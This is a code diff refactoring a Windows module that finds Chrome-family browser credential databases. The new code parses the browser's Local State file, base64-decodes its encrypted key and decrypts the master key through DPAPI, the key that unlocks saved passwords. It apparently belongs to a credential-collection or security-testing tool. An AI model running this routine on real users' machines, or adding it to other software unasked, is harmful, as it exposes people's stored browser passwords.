@@ -1,10 +1,16 @@
+import base64
 import getpass
 import logging
 import os
+from dataclasses import dataclass
 from pathlib import Path
-from typing import Collection, Dict, Optional, Set
+from typing import Any, Collection, Dict, Optional, Set
 
-from .chrome_browser_local_data import ChromeBrowserLocalData
+from .chrome_browser_local_data import (
+    ChromeBrowserLocalData,
+    ChromeBrowserLocalState,
+    read_local_state,
+)
 from .utils import BrowserCredentialsDatabasePath
 from .windows_decryption import win32crypt_unprotect_data
 
@@ -19,22 +25,56 @@ WINDOWS_BROWSERS_DATA_DIR = {
 }
 
 
+@dataclass(kw_only=True)
+class WindowsChromeBrowserLocalState(ChromeBrowserLocalState):
+    master_key: Optional[bytes] = None
+
+
 class WindowsChromeBrowserLocalData(ChromeBrowserLocalData):
+    def __init__(self, local_data_directory_path: Path, profile_names, master_key):
+        super().__init__(local_data_directory_path, profile_names)
+        self._master_key = master_key
+
     @property
     def master_key(self) -> Optional[bytes]:
-        try:
-            master_key = super().master_key
-            master_key = master_key[5:]  # removing DPAPI
-            master_key = win32crypt_unprotect_data(
-                master_key,
-            )
-            return master_key
-        except Exception as err:
-            logger.error(
-                "Exception encountered while trying to get master key "
-                f"from browser's local state: {err}"
-            )
-            return None
+        return self._master_key
+
+
+def create_windows_chrome_browser_local_data(
+    local_data_directory: Path,
+) -> WindowsChromeBrowserLocalData:
+    local_state = WindowsChromeBrowserLocalState()
+    with read_local_state(local_data_directory / "Local State") as local_state_object:
+        local_state = _parse_windows_local_state(local_state_object)
+
+    return WindowsChromeBrowserLocalData(
+        local_data_directory, local_state.profile_names, local_state.master_key
+    )
+
+
+def _parse_windows_local_state(local_state_object: Any) -> WindowsChromeBrowserLocalState:
+    local_state = WindowsChromeBrowserLocalState()
+    try:
+        local_state.profile_names = set(local_state_object["profile"]["info_cache"].keys())
+        encoded_key = local_state_object["os_crypt"]["encrypted_key"]
+        encrypted_key = base64.b64decode(encoded_key)
+        local_state.master_key = _decrypt_windows_master_key(encrypted_key)
+    except (KeyError, TypeError):
+        logger.error("Failed to parse the browser's local state file.")
+    return local_state
+
+
+def _decrypt_windows_master_key(master_key: bytes) -> Optional[bytes]:
+    try:
+        key = master_key[5:]  # removing DPAPI
+        key = win32crypt_unprotect_data(key)
+        return key
+    except Exception as err:
+        logger.error(
+            "Exception encountered while trying to get master key "
+            f"from browser's local state: {err}"
+        )
+        return None
 
 
 class WindowsCredentialsDatabaseSelector:
@@ -79,7 +119,7 @@ class WindowsCredentialsDatabaseSelector:
         browser_local_data_directory_path: Path,
     ) -> Collection[BrowserCredentialsDatabasePath]:
         try:
-            local_data = WindowsChromeBrowserLocalData(browser_local_data_directory_path)
+            local_data = create_windows_chrome_browser_local_data(browser_local_data_directory_path)
         except Exception:
             return []
 
